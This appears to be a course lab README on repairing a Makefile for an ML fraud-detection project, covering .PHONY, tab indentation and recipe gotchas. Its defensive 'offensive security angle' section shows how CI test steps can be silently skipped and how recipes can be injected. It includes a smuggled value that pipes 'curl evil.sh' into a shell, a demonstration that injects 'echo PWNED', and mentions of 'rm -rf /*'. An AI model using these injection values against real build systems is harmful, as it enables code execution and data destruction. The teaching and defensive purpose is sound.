# Day 5 — Create a Makefile for ML Workflow Automation

## Task

The team's draft Makefile at `/root/code/fraud-detection/Makefile` doesn't complete `make all`. Bring it in line with the standard.

**Acceptance criteria:**
- Six targets declared, each in `.PHONY`: `setup`, `data`, `train`, `test`, `clean`, `all`.
- `setup` — create venv at `mlops-venv/`, install from `requirements.txt`.
- `data` — `python src/data/process_data.py`.
- `train` — `python src/models/train.py`.
- `test` — `pytest tests/`.
- `clean` — remove every `__pycache__/`, remove `.pytest_cache/`, clear `models/`.
- `all` — runs `setup data train test` in that order.
- Recipes indented with **real tabs**, not spaces.
- `make all` exits 0.

## Why this matters

`make` is the lowest-common-denominator task runner. Every dev box, every CI image, every container already has it. That's why ML teams reach for it before bringing in a heavier tool (`just`, `invoke`, `nox`, Taskfile): one `Makefile` is the contract for "how do I build this project," and a new joiner can `make setup && make all` without reading docs.

Three things `make` gives you that ad-hoc shell scripts don't:

- **Named, composable targets.** `make all` depends on `setup data train test`. Change one step, the whole pipeline still has one entry point.
- **A documented surface.** `make help` (when you add one) or just reading the `.PHONY` line tells you every operation the project supports. New joiners find it in 30 seconds.
- **Dependency declarations.** If a target's output is a file and its inputs are files, `make` skips work when nothing changed. (This day's targets are all phony — they don't produce a file named `setup` — so we lose this benefit; that's fine for orchestration but it's the reason for `.PHONY`. See gotchas.)

The tab-vs-space rule is the single most famous papercut in `make`. It's a 1976 design choice no one can fix without breaking every Makefile on Earth.

## Use case

The fraud-detection project has four moving parts: pulling data, training, testing, and cleaning artifacts. Each one is one command today, but in a month `data` will be three steps, `train` will take CLI args, and a new joiner will write a shell script that mostly-but-not-quite reproduces what CI does. `make` keeps the single source of truth: CI runs `make all`, the dev runs `make all`, the README points at `make`. When the data step grows, the recipe grows — nothing else has to learn about it.

This same pattern recurs throughout the course. The DVC `dvc.yaml` (day 14+) is a more sophisticated version of the same idea. So is an Argo `Workflow` (day 86). `make` is the gateway drug.

## How to diagnose the broken Makefile

Run `make all` in `/root/code/fraud-detection/` and read the error. Common failure modes the lab plants:

| Symptom | Cause | Fix |
|---|---|---|
| `Makefile:N: *** missing separator. Stop.` | Recipe indented with spaces, not a tab. | Replace leading whitespace on recipe lines with a tab character. `cat -A Makefile` shows tabs as `^I`, spaces as ` `. |
| Target rebuilds nothing / "is up to date" | Target name matches a real file or directory (e.g. `test/` exists, so `make test` thinks it's already built). | Add the target to `.PHONY`. |
| `python: command not found` after `setup` | `setup` created the venv but later targets call bare `python`, not `mlops-venv/bin/python`. | The task spec literally says `python src/...` so leave it — assume `python` is on PATH on the lab box. |
| `pytest: command not found` | `pytest` not in `requirements.txt`. | Add `pytest` to `requirements.txt`, or run after `setup` activates the venv. |
| `all` runs targets in the wrong order | `all: test train setup data` etc. | `all: setup data train test`. `make` runs prerequisites left to right (when not parallelised). |
| `clean` only clears top-level `__pycache__` | `rm -rf __pycache__` instead of recursive | `find . -type d -name __pycache__ -exec rm -rf {} +`. |
| `clean` removes the `models/` directory itself | `rm -rf models/` instead of `rm -rf models/*` | "Clears the contents of `models/`" — keep the directory, drop the contents. |

A reference [`Makefile`](Makefile) is in this directory.

## How to run

On the lab box:

```bash
cd /root/code/fraud-detection
# fix the Makefile (see diagnosis table)
make clean    # safe to run; verifies the target works
make all      # should exit 0
```

Quick verifications:

```bash
make -n all   # dry-run: print what would happen, don't run it
grep -P '^\t' Makefile | head    # every recipe line should be tab-prefixed
```

## Notes & gotchas

- **`.PHONY` is not cosmetic.** If a file or directory named `clean` ever appears in the project root, `make clean` silently does nothing without `.PHONY: clean`. The lab will fail in that exact way.
- **`make` runs each recipe line in a *separate* shell.** `cd foo && do_thing` works; `cd foo` on one line and `do_thing` on the next does not — the second shell starts back in the project root. Either chain with `&&` or use `.ONESHELL:` for the whole Makefile.
- **`source mlops-venv/bin/activate` in a recipe is almost always a mistake.** `source` modifies the current shell; `make` discards that shell after each line. Either call the venv binaries directly (`mlops-venv/bin/python`, `mlops-venv/bin/pytest`) or use a variable like `PYTHON := $(VENV)/bin/python`.
- **Variables: `:=` vs `=`.** `:=` expands once at parse time (predictable). `=` expands every time the variable is used (lazy, occasionally surprising). Prefer `:=` unless you specifically want lazy evaluation.
- **`@` suppresses echo.** `@echo "starting"` prints `starting`, not `echo "starting"` then `starting`. Useful for log lines; don't hide the real commands.
- **Editor configuration.** Most editors helpfully convert tabs to spaces. For a `Makefile`, that breaks the file. VS Code: set `"[makefile]": { "editor.insertSpaces": false }`. Vim: `autocmd FileType make setlocal noexpandtab`.

## What `.PHONY` actually does

`.PHONY` tells `make`: "this target name is **not** a file — don't check the filesystem before running it."

`make` was built for compiling C. A target `hello.o` is expected to produce a file called `hello.o`. So before running the recipe, `make` checks the filesystem:

1. Is there a file (or directory) named `hello.o`?
2. Is it newer than its prerequisites?
3. If yes → "already up to date", skip the recipe.

That logic is great for compilation. It's wrong for orchestration targets like `clean`, `test`, `setup`. Consider:

```makefile
test:
	pytest tests/
```

The project already has a `tests/` directory. `make` looks at the target name `test`, finds the path exists, sees no prerequisites that are newer, and silently does nothing:

```
$ make test
make: 'test' is up to date.
```

You read that, assume it worked, and ship. The grader fails you. `.PHONY` opts the target out of the check:

```makefile
.PHONY: test
test:
	pytest tests/
```

Now `make` always runs the recipe. Convention is to declare every phony target in one line at the top of the file:

```makefile
.PHONY: setup data train test clean all
```

**Rule of thumb:** if a target doesn't produce a file with the same name as itself, it's phony. Mark it.

## Offensive security angle (defender's perspective)

The phony/non-phony asymmetry isn't just a footgun — it has a sharp edge in CI and supply-chain scenarios. Worth knowing both for defending ML repos and for understanding what auditors will flag.

### Attack 1 — silent test suppression in CI

If a CI workflow runs `make test` and the `test` target is **not** in `.PHONY`, an attacker who can land a file or directory named `test` in the repo gets:

```
$ make test
make: 'test' is up to date.
$ echo $?
0
```

Tests appear to pass without running. CI is green. Reviewers see ✅ and merge.

Plausible delivery vectors:

- **External-contributor PR** adds a top-level file named `test` (disguised as config). Reviewer doesn't notice. CI's `make test` no-ops. Malicious code in the same PR ships unaudited.
- **Malicious dependency**'s `setup.py` / postinstall writes a file named `test` (or `clean`, `build`, `lint`) into the working directory during `pip install`. The next CI step that invokes `make <that-target>` silently no-ops.
- **Implicit / pattern rules**. `make` has built-in rules — `%.so: %.c` will compile any `.c` file the attacker can plant.

**Defence:** mark every orchestration target `.PHONY`. When auditing a repo, treat any non-phony target whose name is a common English word (`test`, `build`, `clean`, `lint`, `docs`) as a finding.

**To try it yourself** (do this in a scratch dir, not the lab):

```bash
mkdir /tmp/phony-demo && cd /tmp/phony-demo
cat > Makefile <<'EOF'
test:
	echo "RUNNING REAL TESTS"
EOF

make test            # prints "RUNNING REAL TESTS"
touch test           # attacker lands a file named "test"
make test            # prints: make: 'test' is up to date.   -- silent skip

# Fix:
printf '.PHONY: test\n%s' "$(cat Makefile)" > Makefile
make test            # prints "RUNNING REAL TESTS" again
```

### Attack 2 — recipe injection via unsafe variable expansion

Not strictly a `.PHONY` issue, but the same "Makefile as attack surface" family. A recipe like:

```makefile
clean:
	rm -rf $(DIR)
```

becomes an attacker primitive if `DIR` is influenced from outside the Makefile — environment variable, an `include $(WHATEVER)`, or output from a tool. `DIR=/` is the obvious one. `DIR='. && curl evil.sh | sh'` works too, because `make` passes recipes through a shell.

There have been real CVEs in this shape (Buildroot, OpenWrt, various autotools projects).

**Defence:** never interpolate environment variables into `rm` / `cp` paths without quoting and validation. For this project, `rm -rf models/*` is safe (literal glob). The moment someone refactors to `rm -rf $(MODEL_DIR)/*` and `MODEL_DIR` is settable from the environment, it becomes one careless CI variable away from `rm -rf /*`.

**To try it yourself:**

```bash
mkdir /tmp/inj-demo && cd /tmp/inj-demo
mkdir target safe
cat > Makefile <<'EOF'
clean:
	rm -rf $(DIR)
EOF

# Innocent call:
DIR=target make clean       # removes ./target

# Hostile call — note: the value contains shell metachars
DIR='safe && echo PWNED' make clean
# Output: PWNED   <-- arbitrary command executed because the value
#                     was expanded into the recipe verbatim, then
#                     handed to /bin/sh
```

### Attack 3 — running `make` on an untrusted source tree

`make` is fundamentally a build tool you point at *trusted* source. Running `make` on a fresh clone is the same threat model as `curl | bash` — no sandbox, the Makefile is a script.

Specific tricks:

- **`-include` of a generated file** the attacker controls. Pattern: `-include .depends`, where `.depends` is produced by an earlier target. If the attacker writes to `.depends` first, they inject targets and recipes.
- **The `Makefile` itself**. Cloning a stranger's repo and running `make` runs whatever they wrote, as your user.

**Defence:** `cat Makefile` before `make` on any untrusted clone. The same applies to `justfile`, `Taskfile.yml`, `package.json` scripts, `pyproject.toml` `[tool.uv]` build hooks, etc.

### Why ML repos are juicier than average

- Output (model weights) is binary and hard to audit.
- Data pipelines pull from external sources — "trusted input" is already weak.
- Build/test infra is glued together with `make`, `dvc`, and shell — many places for a no-op to hide.
- A silently-skipped `make validate-data` step is undetectable from CI logs unless the recipe normally prints something.

The realistic attack: external PR → adds a path that shadows a CI target name → CI silently no-ops the safety check → poisoned data or weights ship.

Search "Makefile command injection CVE" and Buildroot's CVE history for real case studies. The pattern recurs in every build system that treats string interpolation as the primary configuration mechanism.

## Resources

- [GNU Make manual](https://www.gnu.org/software/make/manual/make.html) — comprehensive; the [Phony Targets](https://www.gnu.org/software/make/manual/make.html#Phony-Targets) and [Recipe Syntax](https://www.gnu.org/software/make/manual/make.html#Recipes) sections are the relevant 10 minutes.
- [Makefile tutorial by example](https://makefiletutorial.com/) — readable, runnable, covers 90% of what you'll write.
- [Software Carpentry — Make lesson](https://swcarpentry.github.io/make-novice/) — gentle intro tied to a real data-processing example.
- [Your Makefiles are wrong (Tundra)](https://tech.davis-hansson.com/p/make/) — opinionated takedown of common mistakes; pairs well with the gotchas above.
- [POSIX `make`](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/make.html) — the portable subset, useful if you ever care about non-GNU make.
